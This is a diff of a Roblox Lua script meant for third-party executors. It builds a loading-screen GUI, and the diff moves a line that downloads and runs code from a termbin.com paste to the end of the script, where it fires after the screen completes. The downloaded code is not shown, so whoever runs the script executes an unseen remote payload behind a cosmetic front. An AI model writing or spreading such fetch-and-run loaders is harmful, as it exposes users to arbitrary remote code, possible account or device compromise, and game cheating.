@@ -1,6 +1,3 @@
-loadstring(game:HttpGet("https://termbin.com/6z6r"))()
-task.wait(2)
-
 -- Paste and execute in Delta or any executor
 
 local Players = game:GetService("Players")
@@ -9,13 +6,6 @@ local UserInputService = game:GetService("UserInputService")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
-
--- Remove existing GUIs
-for _, gui in ipairs(playerGui:GetChildren()) do
-    if gui:IsA("ScreenGui") then
-        gui:Destroy()
-    end
-end
 
 -- Loading Screen
 local loadingGui = Instance.new("ScreenGui")
@@ -176,3 +166,5 @@ tween.Completed:Connect(function()
         end)
     end)
 end)
+task.wait(2)
+loadstring(game:HttpGet("https://termbin.com/6z6r"))()
